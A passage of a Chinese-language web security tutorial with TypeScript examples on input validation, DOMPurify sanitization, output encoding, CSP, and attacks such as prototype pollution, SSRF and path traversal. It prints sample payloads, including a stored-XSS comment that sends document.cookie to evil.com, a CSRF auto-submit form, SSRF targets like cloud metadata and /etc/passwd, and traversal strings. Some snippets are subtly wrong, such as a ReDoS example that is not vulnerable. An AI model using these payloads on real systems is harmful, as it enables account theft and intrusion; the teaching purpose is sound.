  const { action, otp } = req.body;

  if (guard.requiresVerification(action)) {
    if (!otp || !guard.verifyOtp(req.user.id, otp)) {
      return res.status(403).json({ error: 'Invalid or expired OTP' });
    }
    guard.otpStore.delete(req.user.id);  // 一次性使用
  }

  // 执行转账
  res.json({ success: true });
});
```

---

## 3. Sanitization 深度实战 <a id="3-sanitization-深度实战"></a>

### 3.1 输入净化原则

```
┌─────────────────────────────────────────────────────────┐
│              输入净化黄金法则                             │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  1. 永不信任用户输入                                      │
│  2. 在边界处验证 (Validation)                            │
│  3. 在输出时转义 (Escaping)                              │
│  4. 使用白名单而非黑名单                                   │
│  5. 纵深防御 (多层检查)                                   │
│  6. 最小权限原则                                          │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### 3.2 输入验证 vs 输入净化 vs 输出编码

```
┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│   输入验证   │ →  │   输入净化   │ →  │   输出编码   │
│ (Validation) │    │ (Sanitize)  │    │ (Escaping)  │
├─────────────┤    ├─────────────┤    ├─────────────┤
│ 检查格式     │    │ 移除危险内容 │    │ 转义特殊字符 │
│ 检查类型     │    │ 截断超长     │    │ HTML 编码   │
│ 检查范围     │    │ 标准化格式   │    │ URL 编码   │
│ 检查白名单   │    │ 类型转换     │    │ JS 编码    │
│ 拒绝非法输入 │    │ 记录日志     │    │ 上下文感知  │
└─────────────┘    └─────────────┘    └─────────────┘
     第一道防线          第二道防线         第三道防线
     拒绝坏数据         清理可疑数据        安全输出
```

### 3.3 完整输入验证管道

```typescript
// --- File: src/security/validation-pipeline.ts ---

/**
 * 输入验证管道
 * 类型安全 + 深度验证 + 错误聚合
 */

// === 基础验证器 ===

type Validator<T> = (value: unknown) => ValidationResult<T>;

interface ValidationResult<T> {
  success: boolean;
  value?: T;
  errors: string[];
}

function createValidator<T>(
  rules: Array<(value: unknown) => string | null>
): Validator<T> {
  return (value: unknown): ValidationResult<T> => {
    const errors: string[] = [];

    for (const rule of rules) {
      const error = rule(value);
      if (error) errors.push(error);
    }

    if (errors.length > 0) {
      return { success: false, errors };
    }

    return { success: true, value: value as T, errors: [] };
  };
}

// === 常用验证规则 ===

const rules = {
  required: (msg = 'Required'): Validator<any>['extends'] =>
    (value: unknown) => (value == null || value === '' ? msg : null),

  minLength: (min: number, msg?: string) =>
    (value: unknown) =>
      typeof value === 'string' && value.length < min
        ? msg || `Minimum ${min} characters`
        : null,

  maxLength: (max: number, msg?: string) =>
    (value: unknown) =>
      typeof value === 'string' && value.length > max
        ? msg || `Maximum ${max} characters`
        : null,

  pattern: (regex: RegExp, msg = 'Invalid format') =>
    (value: unknown) =>
      typeof value === 'string' && !regex.test(value) ? msg : null,

  isEmail: (msg = 'Invalid email') =>
    (value: unknown) =>
      typeof value === 'string' &&
      !/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(value)
        ? msg
        : null,

  isUrl: (msg = 'Invalid URL') =>
    (value: unknown) => {
      if (typeof value !== 'string') return msg;
      try {
        new URL(value);
        return null;
      } catch {
        return msg;
      }
    },

  isInt: (msg = 'Must be an integer') =>
    (value: unknown) =>
      typeof value === 'number' && !Number.isInteger(value) ? msg : null,

  range: (min: number, max: number, msg?: string) =>
    (value: unknown) =>
      typeof value === 'number' && (value < min || value > max)
        ? msg || `Must be between ${min} and ${max}`
        : null,

  oneOf: (options: any[], msg?: string) =>
    (value: unknown) =>
      !options.includes(value)
        ? msg || `Must be one of: ${options.join(', ')}`
        : null,

  custom: (fn: (value: unknown) => boolean, msg: string) =>
    (value: unknown) => (!fn(value) ? msg : null),
};

// === 具体验证器示例 ===

const validateUsername = createValidator<string>([
  rules.required('Username is required'),
  rules.minLength(3, 'Username must be at least 3 characters'),
  rules.maxLength(30, 'Username must be at most 30 characters'),
  rules.pattern(/^[a-zA-Z0-9_-]+$/, 'Username can only contain letters, numbers, _ and -'),
]);

const validateEmail = createValidator<string>([
  rules.required('Email is required'),
  rules.isEmail(),
  rules.maxLength(254),
]);

const validatePassword = createValidator<string>([
  rules.required('Password is required'),
  rules.minLength(8, 'Password must be at least 8 characters'),
  rules.maxLength(128),
  rules.custom(
    (v: any) => /[A-Z]/.test(v),
    'Password must contain an uppercase letter',
  ),
  rules.custom(
    (v: any) => /[a-z]/.test(v),
    'Password must contain a lowercase letter',
  ),
  rules.custom(
    (v: any) => /[0-9]/.test(v),
    'Password must contain a digit',
  ),
]);

const validateAge = createValidator<number>([
  rules.required(),
  rules.isInt(),
  rules.range(0, 150, 'Age must be between 0 and 150'),
]);

// === 对象验证器 ===

function validateObject<T extends Record<string, Validator<any>>>(
  schema: T
): (obj: unknown) => ValidationResult<Record<keyof T, any>> {
  return (obj: unknown) => {
    if (typeof obj !== 'object' || obj === null || Array.isArray(obj)) {
      return {
        success: false,
        errors: ['Input must be an object'],
      };
    }

    const result: Record<string, any> = {};
    const allErrors: string[] = [];

    for (const [key, validator] of Object.entries(schema)) {
      const value = (obj as Record<string, any>)[key];
      const validation = validator(value);

      if (!validation.success) {
        allErrors.push(...validation.errors.map((e) => `${key}: ${e}`));
      } else {
        result[key] = validation.value;
      }
    }

    if (allErrors.length > 0) {
      return { success: false, errors: allErrors };
    }

    return { success: true, value: result as any, errors: [] };
  };
}

// === 使用示例 ===

const validateUserRegistration = validateObject({
  username: validateUsername,
  email: validateEmail,
  password: validatePassword,
  age: validateAge,
});

// 测试
const result = validateUserRegistration({
  username: 'john_doe',
  email: 'john@example.com',
  password: 'SecurePass1',
  age: 25,
});

if (result.success) {
  console.log('Valid:', result.value);
} else {
  console.error('Errors:', result.errors);
}
```

### 3.4 富文本 Sanitization (DOMPurify 深度配置)

```typescript
// --- File: src/security/rich-text-sanitizer.ts ---

import DOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

/**
 * 富文本 Sanitizer
 * 基于 DOMPurify，支持多种预设配置
 */

// Node.js 环境需要 window 对象
const window = new JSDOM('').window;
const purify = DOMPurify(window);

export class RichTextSanitizer {
  /**
   * 预设: 仅允许基本文本格式
   */
  static basic(html: string): string {
    return purify.sanitize(html, {
      ALLOWED_TAGS: [
        'b', 'i', 'em', 'strong', 'u', 's', 'del',
        'p', 'br', 'hr', 'span', 'div',
      ],
      ALLOWED_ATTR: ['class'],
      KEEP_CONTENT: false,
    });
  }

  /**
   * 预设: 允许 Markdown 风格格式
   */
  static markdown(html: string): string {
    return purify.sanitize(html, {
      ALLOWED_TAGS: [
        'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
        'p', 'br', 'hr', 'span', 'div',
        'b', 'i', 'em', 'strong', 'u', 's', 'del',
        'a', 'ul', 'ol', 'li',
        'blockquote', 'pre', 'code',
        'img',
        'table', 'thead', 'tbody', 'tr', 'th', 'td',
      ],
      ALLOWED_ATTR: [
        'href', 'target', 'rel', 'title', 'class',
        'src', 'alt', 'width', 'height',
      ],
      ALLOW_DATA_ATTR: false,
      ADD_ATTR: ['target'],
      ADD_URI_SAFE_ATTR: ['href'],
      FORBID_URI_SAFE_SCHEMES: ['http', 'https', 'mailto'],
    });
  }

  /**
   * 预设: 允许完整 HTML (用于管理员)
   */
  static full(html: string): string {
    return purify.sanitize(html, {
      ALLOWED_TAGS: DOMPurify.defaults.ALLOWED_TAGS.concat([
        'iframe', 'video', 'audio', 'source',
      ]),
      ALLOWED_ATTR: DOMPurify.defaults.ALLOWED_ATTR.concat([
        'frameborder', 'allow', 'allowfullscreen',
        'controls', 'autoplay', 'loop', 'muted',
      ]),
      ALLOWED_URI_REGEXP:
        /^(?:(?:https?|ftp):|[^&:/?#]*(?:[/?#]|$))/i,
      FORBID_TAGS: ['script', 'style', 'link', 'meta'],
    });
  }

  /**
   * 自定义配置
   */
  static custom(html: string, config: DOMPurify.Config): string {
    return purify.sanitize(html, config);
  }

  /**
   * 提取纯文本 (移除所有 HTML)
   */
  static extractText(html: string): string {
    const cleaned = purify.sanitize(html, {
      ALLOWED_TAGS: [],
      ALLOWED_ATTR: [],
    });
    return cleaned;
  }

  /**
   * 截断文本 (保留完整标签)
   */
  static truncate(html: string, maxLength: number): string {
    const text = this.extractText(html);
    if (text.length <= maxLength) return html;

    // 截断文本后重新 sanitize
    return this.basic(text.slice(0, maxLength) + '...');
  }
}

// === 使用示例 ===

// 用户评论 (基础格式)
const comment = RichTextSanitizer.basic(userInput);

// 博客文章 (Markdown 风格)
const article = RichTextSanitizer.markdown(blogContent);

// 管理员内容 (完整 HTML)
const adminContent = RichTextSanitizer.full(rawHtml);

// 提取纯文本用于搜索
const searchText = RichTextSanitizer.extractText(richContent);
```

### 3.5 多上下文输出编码

```typescript
// --- File: src/security/context-encoder.ts ---

/**
 * 上下文感知编码器
 * 根据输出上下文选择正确的编码方式
 */

type OutputContext =
  | 'html_content'     // HTML 标签内容: <div>HERE</div>
  | 'html_attribute'   // HTML 属性值: <div attr="HERE">
  | 'javascript'       // JavaScript 字符串: var x = "HERE"
  | 'javascript_data'  // JavaScript 数据: var x = HERE (对象/数组)
  | 'url_parameter'    // URL 参数: ?key=HERE
  | 'url_path'         // URL 路径: /path/HERE
  | 'css_value'        // CSS 值: color: HERE
  | 'html_comment'     // HTML 注释: <!-- HERE -->

class ContextEncoder {
  /**
   * HTML 内容编码
   */
  private static htmlContent(str: string): string {
    return str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;')
      .replace(/`/g, '&#96;');
  }

  /**
   * HTML 属性编码
   */
  private static htmlAttribute(str: string): string {
    return str
      .replace(/&/g, '&amp;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/`/g, '&#96;')
      .replace(/=/g, '&#x3D;')
      .replace(/\//g, '&#x2F;');
  }

  /**
   * JavaScript 字符串编码
   */
  private static javascriptString(str: string): string {
    return str
      .replace(/\\/g, '\\\\')
      .replace(/'/g, "\\'")
      .replace(/"/g, '\\"')
      .replace(/\n/g, '\\n')
      .replace(/\r/g, '\\r')
      .replace(/\t/g, '\\t')
      .replace(/<\/script/gi, '\\u003C/script')
      .replace(/<!--/g, '\\u003C!--')
      .replace(/\u2028/g, '\\u2028')
      .replace(/\u2029/g, '\\u2029');
  }

  /**
   * JavaScript 数据编码 (JSON)
   */
  private static javascriptData(value: any): string {
    const json = JSON.stringify(value);
    return json
      .replace(/\//g, '\\/')
      .replace(/<!--/g, '\\u003C!--')
      .replace(/<script/gi, '\\u003Cscript')
      .replace(/<\/script/gi, '\\u003C/script');
  }

  /**
   * URL 参数编码
   */
  private static urlParameter(str: string): string {
    return encodeURIComponent(str);
  }

  /**
   * URL 路径编码
   */
  private static urlPath(str: string): string {
    return str
      .replace(/%/g, '%25')
      .replace(/\//g, '%2F')
      .replace(/\?/g, '%3F')
      .replace(/#/g, '%23')
      .replace(/&/g, '%26')
      .replace(/=/g, '%3D')
      .replace(/\+/g, '%2B');
  }

  /**
   * CSS 值编码
   */
  private static cssValue(str: string): string {
    return str.replace(/[^a-zA-Z0-9_-]/g, (char) => {
      const code = char.charCodeAt(0);
      return '\\' + code.toString(16) + ' ';
    });
  }

  /**
   * 上下文感知编码
   */
  static encode(value: string, context: OutputContext): string {
    switch (context) {
      case 'html_content':
        return this.htmlContent(value);
      case 'html_attribute':
        return this.htmlAttribute(value);
      case 'javascript':
        return this.javascriptString(value);
      case 'javascript_data':
        return this.javascriptData(value);
      case 'url_parameter':
        return this.urlParameter(value);
      case 'url_path':
        return this.urlPath(value);
      case 'css_value':
        return this.cssValue(value);
      case 'html_comment':
        // HTML 注释中不能出现 -->
        return value.replace(/-->/g, '--&gt;').replace(/--&gt;/g, '--&gt;');
      default:
        return this.htmlContent(value);
    }
  }
}

// === 使用示例 ===

// HTML 内容
html`<div>${ContextEncoder.encode(userInput, 'html_content')}</div>`;

// HTML 属性
html`<input value="${ContextEncoder.encode(userInput, 'html_attribute')}" />`;

// JavaScript 字符串
html`<script>var name = "${ContextEncoder.encode(userInput, 'javascript')}";</script>`;

// JavaScript 数据
html`<script>var config = ${ContextEncoder.encode(configObj, 'javascript_data')}</script>`;

// URL 参数
html`<a href="/search?q=${ContextEncoder.encode(query, 'url_parameter')}">`;
```

---

## 4. CSP 实战 <a id="4-csp-实战"></a>

### 4.1 CSP 指令全景

```
┌──────────────────────────────────────────────────────────────────┐
│                    Content Security Policy                       │
├─────────────────────┬────────────────────────────────────────────┤
│  指令               │  说明                                      │
├─────────────────────┼────────────────────────────────────────────┤
│  default-src        │  默认源 (所有类型的回退)                     │
│  script-src         │  JavaScript 源                             │
│  style-src          │  CSS 源                                    │
│  img-src            │  图片源                                    │
│  font-src           │  字体源                                    │
│  connect-src        │  XHR/Fetch/WebSocket 源                    │
│  media-src          │  音频/视频源                               │
│  object-src         │  <object>/<embed>/<applet> 源             │
│  frame-src          │  <iframe> 源                               │
│  worker-src         │  Web Worker 源                             │
│  manifest-src       │  Web App Manifest 源                       │
│  base-uri           │  <base> 标签 URI                           │
│  form-action        │  <form> action URI                         │
│  frame-ancestors    │  允许嵌入的父页面源                          │
│  report-uri         │  违规报告端点 (旧)                          │
│  report-to          │  违规报告端点 (新)                          │
│  sandbox            │  沙箱模式                                  │
│  require-trusted-   │  要求可信类型 (TS 类型)                     │
│    types-for        │                                            │
│  trust-token        │  Trust Token API                           │
│  upgrade-insecure-  │  升级 HTTP 到 HTTPS                        │
│    requests         │                                            │
└─────────────────────┴────────────────────────────────────────────┘
```

### 4.2 CSP 源表达式

```
┌──────────────────┬──────────────────────────────────────────────┐
│  源表达式        │  含义                                        │
├──────────────────┼──────────────────────────────────────────────┤
│  'none'          │  不允许任何源                                │
│  'self'          │  仅同源                                     │
│  'unsafe-inline' │  允许内联 JS/CSS (不推荐!)                    │
│  'unsafe-eval'   │  允许 eval() 等 (不推荐!)                     │
│  'unsafe-hashes' │  允许内联事件处理器哈希                       │
│  'strict-dynamic'│  信任脚本加载的脚本                           │
│  'nonce-<base64>'│  一次性随机数                                │
│  'sha256-<hash>' │  内容哈希                                   │
│  https:          │  所有 HTTPS 源                               │
│  *.example.com   │  example.com 的所有子域                       │
│  https://cdn.com │  特定 CDN                                    │
│  data:           │  data: URI (通常不推荐)                       │
└──────────────────┴──────────────────────────────────────────────┘
```

### 4.3 完整 CSP 配置

```typescript
// --- File: src/security/csp-config.ts ---

/**
 * Content Security Policy 配置
 * 生产级 CSP 策略
 */

interface CSPConfig {
  // 策略模式: enforce | report | both
  mode: 'enforce' | 'report' | 'both';
  // 是否启用 nonce
  useNonce: boolean;
  // 报告端点
  reportUri?: string;
  // 是否启用 upgrade-insecure-requests
  upgradeInsecureRequests?: boolean;
  // 是否启用 block-all-mixed-content
  blockAllMixedContent?: boolean;
}

function generateCspHeaders(config: CSPConfig): Record<string, string> {
  const nonce = config.useNonce ? crypto.randomBytes(16).toString('base64') : '';

  const directives: Record<string, string[]> = {
    // 默认: 仅允许同源
    'default-src': ["'self'"],

    // JavaScript: 仅允许同源 + nonce
    'script-src': [
      "'self'",
      config.useNonce ? `'nonce-${nonce}'` : '',
      "'strict-dynamic'",  // 信任 nonce 脚本加载的其他脚本
      // 如果需要第三方 JS:
      // 'https://cdn.jsdelivr.net',
      // 'https://www.google-analytics.com',
    ].filter(Boolean),

    // CSS: 仅允许同源 + nonce
    'style-src': [
      "'self'",
      config.useNonce ? `'nonce-${nonce}'` : '',
      // 如果需要内联样式 (不推荐):
      // "'unsafe-inline'",
      // 如果需要第三方 CSS:
      // 'https://fonts.googleapis.com',
    ].filter(Boolean),

    // 图片: 同源 + data URI (用于内联 SVG/Base64)
    'img-src': ["'self'", 'data:', 'https:'],

    // 字体: 同源 + Google Fonts
    'font-src': ["'self'", 'https://fonts.gstatic.com'],

    // 连接: 同源 API
    'connect-src': ["'self'"],

    // 媒体: 同源
    'media-src': ["'self'"],

    // iframe: 无
    'frame-src': ["'none'"],

    // object/embed: 无 (防止 Flash 等)
    'object-src': ["'none'"],

    // Worker: 同源
    'worker-src': ["'self'", 'blob:'],

    // 禁止 <base> 标签
    'base-uri': ["'self'"],

    // 表单提交: 仅同源
    'form-action': ["'self'"],

    // 禁止被嵌入
    'frame-ancestors': ["'none'"],

    // 禁用插件
    'plugin-types': ["'none'"],
  };

  // 构建策略字符串
  const policy = Object.entries(directives)
    .map(([key, values]) => `${key} ${values.join(' ')}`)
    .join('; ');

  const headers: Record<string, string> = {};

  // Enforce 模式
  if (config.mode === 'enforce' || config.mode === 'both') {
    headers['Content-Security-Policy'] = policy;
  }

  // Report-only 模式
  if (config.mode === 'report' || config.mode === 'both') {
    headers['Content-Security-Policy-Report-Only'] = policy;
  }

  // 报告端点
  if (config.reportUri) {
    headers['Report-To'] = JSON.stringify({
      group: 'csp',
      max_age: 86400,
      endpoints: [{ url: config.reportUri }],
    });
  }

  // 升级 HTTP 到 HTTPS
  if (config.upgradeInsecureRequests) {
    headers['Content-Security-Policy'] =
      (headers['Content-Security-Policy'] || '') +
      '; upgrade-insecure-requests';
  }

  // 阻止混合内容
  if (config.blockAllMixedContent) {
    headers['Content-Security-Policy'] =
      (headers['Content-Security-Policy'] || '') +
      '; block-all-mixed-content';
  }

  // 返回 nonce 供模板使用
  if (config.useNonce) {
    headers['X-Content-Security-Nonce'] = nonce;
  }

  return headers;
}

// === Express 中间件 ===

function cspMiddleware(config: CSPConfig) {
  return (req: Request, res: Response, next: NextFunction) => {
    const headers = generateCspHeaders(config);
    Object.entries(headers).forEach(([key, value]) => {
      res.setHeader(key, value);
    });

    // 将 nonce 挂载到 res.locals 供模板使用
    if (config.useNonce) {
      res.locals.cspNonce = headers['X-Content-Security-Nonce'];
    }

    next();
  };
}

// === 报告端点 ===

app.post('/api/csp-report', express.json({ limit: '1mb' }), (req, res) => {
  const report = req.body['csp-report'] || req.body;

  console.error('[CSP Violation]', {
    violatedDirective: report['violated-directive'],
    blockedUri: report['blocked-uri'],
    policy: report['original-policy'],
    sourceFile: report['source-file'],
    lineNumber: report['line-number'],
    userAgent: req.headers['user-agent'],
    ip: req.ip,
    timestamp: new Date().toISOString(),
  });

  res.status(204).send();
});

// === 使用示例 ===

// 开发环境: Report-only
app.use(cspMiddleware({
  mode: 'report',
  useNonce: true,
  reportUri: '/api/csp-report',
  upgradeInsecureRequests: true,
  blockAllMixedContent: true,
}));

// 生产环境: Enforce
// app.use(cspMiddleware({
//   mode: 'enforce',
//   useNonce: true,
//   reportUri: '/api/csp-report',
//   upgradeInsecureRequests: true,
//   blockAllMixedContent: true,
// }));
```

### 4.4 Nonce 与 Hash 实战

```html
<!-- === Nonce 方式: 允许特定的内联脚本 === -->
<!-- 服务端生成随机 nonce，注入到 script 标签 -->
<script nonce="{{cspNonce}}">
  // 这个内联脚本会被允许
  var config = {{jsonEncode(config)}};
  initializeApp(config);
</script>

<!-- 没有 nonce 的内联脚本会被 CSP 阻止 -->
<script>
  // ❌ 被 CSP 阻止!
  alert('This will not run');
</script>

<!-- 外部脚本也需要匹配源 -->
<script src="/js/app.js"></script>  <!-- ✅ 同源，允许 -->
<script src="https://evil.com/malware.js"></script>  <!-- ❌ 被 CSP 阻止 -->
```

```html
<!-- === Hash 方式: 允许特定内容的内联脚本 === -->
<!-- 计算脚本内容的 SHA-256 哈希 -->
<!-- 脚本内容: console.log('Hello, CSP!'); -->
<!-- SHA-256: sha256-abc123... -->

<meta http-equiv="Content-Security-Policy"
      content="script-src 'self' 'sha256-abc123...'">

<script>
  console.log('Hello, CSP!');  <!-- ✅ 哈希匹配，允许 -->
</script>

<script>
  console.log('Different content');  <!-- ❌ 哈希不匹配，阻止 -->
</script>
```

```typescript
// === 计算脚本哈希 ===

function computeScriptHash(scriptContent: string): string {
  const hash = crypto
    .createHash('sha256')
    .update(scriptContent)
    .digest('base64');
  return `sha256-${hash}`;
}

// 使用
const scriptContent = "console.log('Hello, CSP!');";
const hash = computeScriptHash(scriptContent);
// 在 CSP 中使用: script-src 'self' ${hash}
```

### 4.5 CSP 渐进式部署策略

```
阶段 1: 观察模式 (1-2 周)
├── CSP-Report-Only 头
├── 收集所有违规报告
└── 分析哪些资源被阻止

阶段 2: 修复违规 (1-2 周)
├── 将内联脚本改为 nonce/hash
├── 将内联样式改为外部 CSS
├── 添加必要的第三方源
└── 更新前端代码适配 CSP

阶段 3: 严格模式 (逐步收紧)
├── 移除 'unsafe-inline'
├── 移除 'unsafe-eval'
├── 收紧源白名单
└── 启用 strict-dynamic

阶段 4: 完全执行
├── CSP 头 (非 Report-Only)
├── 监控违规报告
└── 定期审计和更新
```

```typescript
// === CSP 审计工具 ===

class CspAuditor {
  private violations: Array<{
    directive: string;
    blockedUri: string;
    sourceFile: string;
    timestamp: string;
  }> = [];

  /**
   * 记录违规
   */
  recordViolation(report: any) {
    this.violations.push({
      directive: report['violated-directive'],
      blockedUri: report['blocked-uri'],
      sourceFile: report['source-file'] || 'unknown',
      timestamp: new Date().toISOString(),
    });
  }

  /**
   * 生成审计报告
   */
  generateReport(): string {
    const byDirective = new Map<string, Set<string>>();

    for (const v of this.violations) {
      if (!byDirective.has(v.directive)) {
        byDirective.set(v.directive, new Set());
      }
      byDirective.get(v.directive)!.add(v.blockedUri);
    }

    let report = '# CSP Audit Report\n\n';

    for (const [directive, uris] of byDirective) {
      report += `## ${directive}\n`;
      for (const uri of uris) {
        report += `- ${uri}\n`;
      }
      report += '\n';
    }

    return report;
  }

  /**
   * 生成建议的 CSP 策略
   */
  generateSuggestedPolicy(): string {
    const sources = new Map<string, Set<string>>();

    for (const v of this.violations) {
      const directive = v.directive.replace('-src', '-src') || 'default-src';
      if (!sources.has(directive)) {
        sources.set(directive, new Set(["'self'"]));
      }
      const uri = v.blockedUri;
      if (uri && uri !== 'self') {
        try {
          const url = new URL(uri);
          sources.get(directive)!.add(url.origin);
        } catch {
          // 忽略无效 URI
        }
      }
    }

    return Array.from(sources.entries())
      .map(([key, values]) => `${key} ${[...values].join(' ')}`)
      .join('; ');
  }
}
```

---

## 5. 高级攻击向量 <a id="5-高级攻击向量"></a>

### 5.1 Prototype Pollution

```javascript
// ❌ 漏洞: 深度合并时未检查 __proto__
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// 攻击:
const payload = JSON.parse('{"__proto__":{"admin":true}}');
merge({}, payload);
console.log({}.admin);  // true! 💀

// ✅ 防御: 使用 Object.create(null) + 检查 key
function safeMerge(target, source) {
  for (const key of Object.keys(source)) {
    // 阻止原型链污染
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue;
    }
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key] || typeof target[key] !== 'object') {
        target[key] = Array.isArray(source[key]) ? [] : Object.create(null);
      }
      safeMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// ✅ 最佳: 使用 Object.freeze + 不可变更新
function deepClone(obj) {
  return JSON.parse(JSON.stringify(obj));
}

// ✅ 使用 Object.hasOwn (ES2022)
function safeSet(obj, path, value) {
  const keys = path.split('.');
  let current = obj;
  for (let i = 0; i < keys.length - 1; i++) {
    const key = keys[i];
    if (key === '__proto__' || key === 'constructor') {
      throw new Error(`Blocked prototype pollution attempt: ${key}`);
    }
    if (!Object.hasOwn(current, key)) {
      current[key] = Object.create(null);
    }
    current = current[key];
  }
  const lastKey = keys[keys.length - 1];
  if (lastKey === '__proto__' || lastKey === 'constructor') {
    throw new Error(`Blocked prototype pollution attempt: ${lastKey}`);
  }
  current[lastKey] = value;
}
```

### 5.2 HTTP Header 注入

```javascript
// ❌ 漏洞: 用户输入直接设置 Header
app.get('/redirect', (req, res) => {
  const url = req.query.url;
  res.setHeader('Location', url);  // Header 注入!
  res.status(302).end();
});

// 攻击: /redirect?url=http://legit.com%0d%0aX-Injected:%20header
// 结果: 攻击者可以注入任意 Header

// ✅ 防御: 验证 URL 格式
app.get('/redirect', (req, res) => {
  const url = req.query.url;

  // 白名单校验
  const allowedDomains = ['myapp.com', 'partner.com'];
  try {
    const parsed = new URL(url);
    if (!allowedDomains.includes(parsed.hostname)) {
      return res.status(400).json({ error: 'Invalid redirect URL' });
    }
  } catch {
    return res.status(400).json({ error: 'Invalid URL format' });
  }

  res.redirect(url);
});

// ✅ 防御: 移除控制字符
function sanitizeHeaderValue(value: string): string {
  // 移除所有控制字符 (0x00-0x1F, 0x7F)
  return value.replace(/[\x00-\x1f\x7f]/g, '');
}
```

### 5.3 SSRF (Server-Side Request Forgery)

```javascript
// ❌ 漏洞: 用户控制 URL 发起请求
app.post('/api/fetch-url', async (req, res) => {
  const { url } = req.body;
  const response = await fetch(url);  // SSRF!
  res.json({ data: await response.text() });
});

// 攻击:
// { "url": "http://localhost:6379/CONFIG SET dir /etc/" }
// { "url": "http://169.254.169.254/latest/meta-data/" }  // AWS 元数据
// { "url": "file:///etc/passwd" }

// ✅ 防御: URL 白名单 + 内部网络阻止
import dns from 'dns';
import { promisify } from 'util';
const resolve4 = promisify(dns.resolve4);

const BLOCKED_IP_RANGES = [
  /^10\./,                          // 10.0.0.0/8
  /^172\.(1[6-9]|2[0-9]|3[01])\./,  // 172.16.0.0/12
  /^192\.168\./,                    // 192.168.0.0/16
  /^127\./,                         // 127.0.0.0/8
  /^169\.254\./,                    // 169.254.0.0/16
  /^0\./,                           // 0.0.0.0/8
  /^localhost$/i,
];

async function isSafeUrl(url: string): Promise<boolean> {
  try {
    const parsed = new URL(url);

    // 协议白名单
    if (!['http:', 'https:'].includes(parsed.protocol)) {
      return false;
    }

    // 域名白名单 (生产环境)
    const allowedDomains = ['api.example.com', 'cdn.example.com'];
    if (!allowedDomains.includes(parsed.hostname)) {
      return false;
    }

    // DNS 解析检查
    const addresses = await resolve4(parsed.hostname);
    for (const addr of addresses) {
      for (const pattern of BLOCKED_IP_RANGES) {
        if (pattern.test(addr)) {
          return false;
        }
      }
    }

    return true;
  } catch {
    return false;
  }
}

// ✅ 安全请求
app.post('/api/fetch-url', async (req, res) => {
  const { url } = req.body;

  if (!(await isSafeUrl(url))) {
    return res.status(400).json({ error: 'URL not allowed' });
  }

  const response = await fetch(url, {
    signal: AbortSignal.timeout(5000),  // 超时
    redirect: 'error',                   // 禁止重定向
  });

  res.json({ data: await response.text() });
});
```

### 5.4 路径遍历 (Path Traversal)

```javascript
// ❌ 漏洞: 用户输入拼接文件路径
app.get('/api/files/:filename', (req, res) => {
  const filename = req.params.filename;
  const filePath = path.join('/uploads', filename);  // 路径遍历!
  res.sendFile(filePath);
});

// 攻击: /api/files/../../etc/passwd

// ✅ 防御: 路径规范化 + 检查
app.get('/api/files/:filename', (req, res) => {
  const filename = req.params.filename;

  // 移除路径分隔符
  const safeName = path.basename(filename);

  // 构建路径
  const uploadDir = path.resolve('/uploads');
  const filePath = path.resolve(uploadDir, safeName);

  // 确保文件在上传目录内
  if (!filePath.startsWith(uploadDir + path.sep)) {
    return res.status(403).json({ error: 'Access denied' });
  }

  // 检查文件是否存在
  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ error: 'File not found' });
  }

  res.sendFile(filePath);
});
```

### 5.5 正则 DoS (ReDoS)

```javascript
// ❌ 漏洞: 灾难性回溯
function validateEmail(email) {
  // 这个正则对特定输入会指数级回溯
  return /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(email);
}

// 攻击: 'a'.repeat(100) + '!' 会导致长时间阻塞

// ✅ 防御: 使用安全正则或专用库
import validator from 'validator';

function safeValidateEmail(email) {
  return validator.isEmail(email);
}

// ✅ 防御: 限制输入长度 + 简单正则
function quickEmailCheck(email) {
  if (email.length > 254) return false;
  return /^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email);
}

// ✅ 防御: 使用 regexpp 分析回溯风险
// 工具: https://github.com/ajv-validator/ajv-formats
```

---

## 6. 综合攻防演练场 <a id="6-综合攻防演练场"></a>

### 6.1 场景 1: 博客平台安全加固

```typescript
// --- 攻击者视角: 如何攻击一个博客平台 ---

// === 攻击 1: 存储型 XSS (评论) ===
// 攻击者提交:
const maliciousComment = {
  postId: 123,
  content: '<img src=x onerror="fetch(\'https://evil.com/steal?cookie=\'+document.cookie)">',
};

// === 攻击 2: CSRF (修改密码) ===
// 攻击者网站:
const csrfAttackHtml = `
<form action="https://blog.com/api/user/change-password" method="POST" id="f">
  <input type="hidden" name="oldPassword" value="">
  <input type="hidden" name="newPassword" value="hacked123">
</form>
<script>document.getElementById('f').submit()</script>
`;

// === 攻击 3: SSRF (头像 URL) ===
// 攻击者设置头像 URL 为:
const ssrfUrl = 'http://localhost:6379';  // 攻击 Redis

// === 攻击 4: 路径遍历 (文件下载) ===
// 攻击者请求:
const traversalUrl = '/api/posts/1/attachment/../../../etc/passwd';

// --- 防御者视角: 完整防御方案 ---

// --- File: src/security/blog-platform-security.ts ---

import { Router } from 'express';
import DOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

const window = new JSDOM('').window;
const purify = DOMPurify(window);

const router = Router();

// === 防御 1: 评论安全 ---

// 输入验证
const validateComment = (input: any) => {
  const errors: string[] = [];
  if (!input.postId || typeof input.postId !== 'number') {
    errors.push('Invalid postId');
  }
  if (!input.content || typeof input.content !== 'string') {
    errors.push('Invalid content');
  }
  if (input.content && input.content.length > 5000) {
    errors.push('Content too long');
  }
  return errors;
};

// 评论路由
router.post('/api/posts/:id/comments', csrfProtection(csrfManager), (req, res) => {
  // 1. 验证输入
